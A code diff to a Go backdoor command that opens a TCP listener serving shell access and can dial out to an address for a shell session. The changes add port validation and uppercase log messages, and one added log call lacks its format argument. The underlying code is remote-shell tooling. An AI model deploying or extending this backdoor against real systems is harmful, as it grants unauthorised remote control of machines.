@@ -64,6 +64,9 @@ func (cmd *backDoorCmd) Run(fl *pflag.FlagSet) {
 }
 
 func create(port int) error {
+	if port < 1 || port > TotalPorts {
+		return fmt.Errorf("%d is an invalid port", port)
+	}
 	cmd, err := getSysCmd()
 	if err != nil {
 		return err
@@ -73,10 +76,15 @@ func create(port int) error {
 	signal.Notify(stop, signals...)
 	connChan := make(chan net.Conn, 1)
 
+	flog.Info("STARTING LISTENER ON :%d", port)
+
 	lsnr, err := net.Listen(tcp, fmt.Sprintf(":%d", port))
 	if err != nil {
 		return err
 	}
+
+	flog.Success("NOW SERVING SHELL ACCESS ON :%d", port)
+	flog.Success("READY FOR INBOUND CONNECTIONS")
 
 	go func() {
 		conn, err := lsnr.Accept()
@@ -84,14 +92,14 @@ func create(port int) error {
 			flog.Error(err.Error())
 			return
 		}
-		flog.Success("connection established : %s", conn.RemoteAddr().String())
+		flog.Success("%s HAS CONNECTED", conn.RemoteAddr().String())
 		connChan <- conn
 	}()
 
 	for {
 		select {
 		case signal := <-stop:
-			flog.Info("received disconnect signal : %s", signal)
+			flog.Info("RECEIVED %s SIGNAL", signal)
 			close(connChan)
 			for conn := range connChan {
 				conn.Close()
@@ -107,10 +115,15 @@ func create(port int) error {
 }
 
 func connect(address string) error {
+	flog.Info("DIALING %s")
+
 	conn, err := net.Dial(tcp, address)
 	if err != nil {
 		return err
 	}
+
+	flog.Success("CONNECTION ESTABLISHED")
+	flog.Info("STARTING SHELL SESSION")
 
 	c := make(chan os.Signal, 1)
 	signal.Notify(c, signals...)
@@ -119,7 +132,7 @@ func connect(address string) error {
 		defer conn.Close()
 		for {
 			sig := <-c
-			flog.Info("received termination signal : %v", sig)
+			flog.Info("RECEIVED %v SIGNAL", sig)
 			return
 		}
 	}()
